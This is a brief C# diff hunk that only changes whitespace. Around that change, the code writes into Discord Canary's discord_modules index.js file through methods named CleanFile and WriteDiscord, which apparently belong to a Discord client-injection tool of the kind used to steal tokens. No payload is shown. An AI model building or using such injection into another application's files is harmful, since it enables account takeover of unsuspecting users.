@@ -86,7 +86,7 @@ namespace Furious
 					{
 						FileManagement.CanaryPath = folderName + @"\modules\discord_modules\index.js";
 						await FileManagement.CleanFile(FileManagement.CanaryPath);
-                        await FileManagement.WriteDiscord(FileManagement.CanaryPath);
+                       				await FileManagement.WriteDiscord(FileManagement.CanaryPath);
 					}
 				}
 			}
